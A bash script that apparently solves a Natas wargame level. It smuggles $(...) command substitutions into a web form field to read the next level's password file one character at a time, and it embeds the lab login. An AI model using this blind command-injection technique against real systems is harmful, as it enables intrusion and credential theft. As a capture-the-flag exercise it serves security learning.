#!/bin/bash


simplepos() { # START these are the different injected bash commands
# (executed on server) $1 should be 1-32 for position in password
	echo "\$(expr substr \$(cat /etc/natas_webpass/natas17) $1 1)";
}
numpos() {
	echo "\$(expr substr \$(tr 0-9 a-j < /etc/natas_webpass/natas17) $1 1)";
}
upperpos() { # if lowercase: needle -> "" ;if uppercase: needle -> "many words"
	echo "\$(expr substr \$(tr a-z 0 < /etc/natas_webpass/natas17) $1 1)";
} # END injected bash commands
bestletter() {
	tr " " "\n" | python3 bestletter.py;
}
needle() {
	curl -s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/ --data-urlencode "needle=$1" | sed -z "s/.*<pre>\(.*\)<\/pre>.*/\1/g" | tr "[A-Z]" "[a-z]" | tr -d "'"
}

searchat() {
	result="$(needle "$(simplepos $1)")"
	if [[ $(strings <<< "$result") = "" ]]
	then # is number
		needle "$(numpos $1)" | bestletter | tr a-j 0-9
	else # is letter
		chr=$(bestletter <<< "$result") #this is lowercase
		result="$(needle "$(upperpos $1)")"
		if [[ $(strings <<< "$result") = "" ]]
		then #is lowercase
			echo "$chr"
		else # is uppercase
			echo "$chr" | tr a-z A-Z
		fi
	fi
}

findall() {
	for i in {1..32}
	do
		echo -n "$(searchat $i)"
	done
	echo
}
	
